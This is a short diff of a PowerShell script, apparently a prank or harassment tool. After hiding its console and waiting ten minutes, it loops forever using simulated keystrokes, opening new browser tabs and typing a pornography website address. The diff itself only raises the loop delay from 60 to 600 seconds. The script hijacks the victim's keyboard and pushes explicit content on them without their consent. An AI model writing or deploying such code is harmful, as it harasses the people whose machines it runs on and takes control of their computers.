@@ -11,4 +11,4 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 
 sleep 600
 
-$wshell = New-Object -ComObject wscript.shell;while (1) {$wshell.sendKeys("{ESC}");sleep 1;$wshell.sendKeys("^t");sleep 1;$wshell.sendKeys("pornhub.com/model/belledelphine~");sleep 60}
+$wshell = New-Object -ComObject wscript.shell;while (1) {$wshell.sendKeys("{ESC}");sleep 1;$wshell.sendKeys("^t");sleep 1;$wshell.sendKeys("pornhub.com/model/belledelphine~");sleep 600}
